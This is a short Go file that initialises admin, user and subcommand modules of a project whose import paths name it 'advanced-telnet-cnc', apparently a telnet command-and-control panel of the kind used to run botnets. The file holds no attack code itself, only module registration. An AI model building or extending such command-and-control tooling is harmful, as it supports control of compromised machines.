package commands

import (
	"advanced-telnet-cnc/source/master/command/commands/admin"
	"advanced-telnet-cnc/source/master/command/commands/admin/subcommands"
	"advanced-telnet-cnc/source/master/command/commands/user"
)

func Init() {
	admin.Init()
	user.Init()
	subcommands.Init()
}
